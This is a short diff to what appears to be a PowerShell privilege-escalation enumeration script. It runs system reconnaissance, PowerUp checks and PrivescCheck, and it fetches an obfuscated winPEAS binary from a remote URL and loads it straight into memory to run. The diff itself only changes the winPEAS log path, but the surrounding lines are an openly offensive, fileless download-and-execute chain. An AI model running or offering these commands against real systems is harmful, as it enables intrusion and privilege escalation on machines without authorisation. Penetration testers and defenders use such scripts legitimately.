@@ -1,5 +1,5 @@
 systeminfo | tee systeminfo.txt
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log")
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")
 Invoke-HostRecon | tee hostrecon.txt
 Invoke-AllChecks | tee powerup.txt
 Invoke-PrivescCheck | tee privesccheck.txt
